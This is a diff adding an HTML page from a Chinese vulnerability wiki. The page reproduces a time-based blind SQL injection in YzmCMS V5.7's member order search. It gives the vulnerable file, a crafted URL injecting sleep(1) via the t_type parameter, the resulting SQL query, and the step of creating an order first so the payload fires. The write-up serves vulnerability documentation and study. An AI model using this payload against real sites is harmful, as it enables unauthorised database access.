@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/YzmCMS/YzmCMS%20V5.7%20%E7%94%A8%E6%88%B7%E6%A8%A1%E5%9D%97%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>YzmCMS V5.7 用户模块时间盲注 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "YzmCMS V5.7 \u7528\u6237\u6a21\u5757\u65f6\u95f4\u76f2\u6ce8", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_4" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../YzmCMS%20v3.6%20csrf/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../YzmCMS%20v3.6%20csrf/" class="btn btn-xs btn-link">
+        YzmCMS v3.6 csrf
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../YzmCMS%20V5.4%20%E5%90%8E%E5%8F%B0getshell%EF%BC%88%E4%BA%8C%EF%BC%89/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../YzmCMS%20V5.4%20%E5%90%8E%E5%8F%B0getshell%EF%BC%88%E4%BA%8C%EF%BC%89/" class="btn btn-xs btn-link">
+        YzmCMS V5.4 后台getshell（二）
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="yzmcms-v57">YzmCMS V5.7 用户模块时间盲注<a class="headerlink" href="#yzmcms-v57" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>YzmCMS V5.7</p>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p><code>application/member/controller/order.class.php</code>:76行</p>
+<p>这里直接拼接了where条件，type这里就有问题</p>
+<p><img alt="1.png" src="../resource/YzmCMSV5.7%E7%94%A8%E6%88%B7%E6%A8%A1%E5%9D%97%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/media/rId24.png" /></p>
+<p>构造url</p>
+<div class="codehilite"><pre><span></span><code>http://www.0-sec.org/member/order/order_search.html?of=id&amp;or=DESC&amp;dosubmit=1&amp;&amp;t_type=sleep(1)
+</code></pre></div>
+
+<p>调试跟一下可以看到如果传入的是数组会手动拆分进行预编译处理，但是我们这里是str
+不是数组 所以就直接跳过处理</p>
+<p><img alt="2.png" src="../resource/YzmCMSV5.7%E7%94%A8%E6%88%B7%E6%A8%A1%E5%9D%97%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/media/rId25.png" />直接带入数据库，完成sleep</p>
+<p><img alt="3.png" src="../resource/YzmCMSV5.7%E7%94%A8%E6%88%B7%E6%A8%A1%E5%9D%97%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/media/rId26.png" /></p>
+<p>看了下语句发现这里利用的时候有一个小问题，首先这里是查数据数，在该表没数据的情况下是不会sleep的，所以要先在yzm_order中插入一条数据。<img alt="4.png" src="../resource/YzmCMSV5.7%E7%94%A8%E6%88%B7%E6%A8%A1%E5%9D%97%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/media/rId27.png" /></p>
+<div class="codehilite"><pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="nf">COUNT</span><span class="p">(</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">total</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n n-Quoted">`yzmcms`</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="n n-Quoted">`yzm_order`</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n n-Quoted">`type`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</code></pre></div>
+
+<p>使用在线充值，会产生一条订单的数据</p>
+<p><img alt="5.png" src="../resource/YzmCMSV5.7%E7%94%A8%E6%88%B7%E6%A8%A1%E5%9D%97%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/media/rId28.png" /></p>
+<p>在没有配置支付的情况下会报错，但是这个订单是创建了。</p>
+<p><img alt="6.png" src="../resource/YzmCMSV5.7%E7%94%A8%E6%88%B7%E6%A8%A1%E5%9D%97%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/media/rId29.png" /><img alt="7.png" src="../resource/YzmCMSV5.7%E7%94%A8%E6%88%B7%E6%A8%A1%E5%9D%97%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/media/rId30.png" />这样就可以执行sleep了</p>
+<p><img alt="8.png" src="../resource/YzmCMSV5.7%E7%94%A8%E6%88%B7%E6%A8%A1%E5%9D%97%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/media/rId31.png" /></p>
+<p>时间注入<img alt="9.png" src="../resource/YzmCMSV5.7%E7%94%A8%E6%88%B7%E6%A8%A1%E5%9D%97%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/media/rId32.png" /></p>
+<h2 id="_4">参考链接<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/7985">https://xz.aliyun.com/t/7985</a>#toc-1</p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../YzmCMS%20v3.6%20csrf/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../YzmCMS%20v3.6%20csrf/" class="btn btn-xs btn-link">
+        YzmCMS v3.6 csrf
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../YzmCMS%20V5.4%20%E5%90%8E%E5%8F%B0getshell%EF%BC%88%E4%BA%8C%EF%BC%89/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../YzmCMS%20V5.4%20%E5%90%8E%E5%8F%B0getshell%EF%BC%88%E4%BA%8C%EF%BC%89/" class="btn btn-xs btn-link">
+        YzmCMS V5.4 后台getshell（二）
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
